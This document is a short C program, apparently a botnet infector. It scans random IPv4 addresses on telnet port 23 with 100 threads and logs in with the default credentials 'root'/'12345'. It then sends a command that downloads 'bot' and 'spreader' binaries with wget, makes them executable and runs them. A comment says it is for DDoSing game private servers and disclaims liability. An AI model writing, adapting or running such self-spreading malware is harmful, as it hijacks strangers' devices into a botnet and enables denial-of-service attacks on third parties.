#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <pthread.h>
#include <time.h>

// this is for ddosing aqw private servers only
// i am not liable if you use this for illegal purposes
// nor am i responsible for the actions you take while
// using this program, be careful.

#define user "root\r\n"
#define pass "12345\r\n"
#define cmd "wget http://127.0.0.1/bot && chmod +x bot && ./bot & wget http://127.0.0.1/spreader && chmod +x spreader && ./spreader\r\n"
#define threads 100 // threads for finding


int makeconn(struct sockaddr_in sa) {
 int fd = socket(AF_INET, SOCK_STREAM, 0); 
 if(connect(fd, (struct sockaddr *)&sa, sizeof(sa)) != -1) {
  return fd;
 } else {
  close(fd);
  return 0;
 }
}

char *makerand() {
 int a,b,c,d;
 a = rand() % (254 - 0) + 0;
 b = rand() % (254 - 0) + 0;
 c = rand() % (254 - 0) + 0;
 d = rand() % (254 - 0) + 0;
 char *ip = malloc(16);
 sprintf(ip, "%d.%d.%d.%d", a, b, c, d); 
 return ip;
}

void *findit() {
 struct sockaddr_in sa;
 int fd;
 char *ip = makerand();
 sa.sin_addr.s_addr = inet_addr(ip);
 sa.sin_port = htons(23);
 sa.sin_family = AF_INET;
 if((fd = makeconn(sa))) {
  dprintf(1, "%s",  ip);
  send(fd, user, strlen(user), MSG_NOSIGNAL);
  send(fd, pass, strlen(pass), MSG_NOSIGNAL);
  send(fd, cmd, strlen(cmd), MSG_NOSIGNAL);
 }
 close(fd); 
 free(ip);
}

int find() {
 pthread_t thread[threads];
 int a = 0;
 while(1) {
  for(int i = 0; i < threads; i++) {
   pthread_create(&thread[i], 0, &findit, 0);
  }
  for(int i = 0; i < threads; i++) {
   pthread_join(thread[i], 0);
  }
 }
}

int main() {
 find();
}
